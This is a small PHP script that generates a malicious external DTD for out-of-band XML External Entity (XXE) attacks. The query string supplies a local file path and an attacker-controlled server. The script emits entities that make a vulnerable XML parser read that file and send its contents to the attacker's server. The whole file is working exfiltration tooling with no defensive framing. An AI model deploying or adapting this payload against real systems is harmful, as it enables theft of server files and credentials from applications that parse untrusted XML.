<?php
//Set the content type to the dtd mime type
header('Content-Type: application/xml-dtd');
//Set the Cache Control/Expires to ensure the page isn't cached
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
//Get the filename to read from the querystring
$filename = $_GET['file'];
//Get the server to send the data to from the querystring
$server = $_GET['s'];
//Set the entity resource to read
$entityResource = '<!ENTITY % resource SYSTEM "file://'.htmlspecialchars($filename,ENT_QUOTES).'">';
//Set the exfiltration url with the contents of the entityResource
$entityOOB = '<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM \''.htmlspecialchars($server,ENT_QUOTES).'?p=%resource;\'>">'; 
//Write out the XML of the dtd created with a new line separating the Entities
echo $entityResource;
echo "\n";
echo $entityOOB;
?>
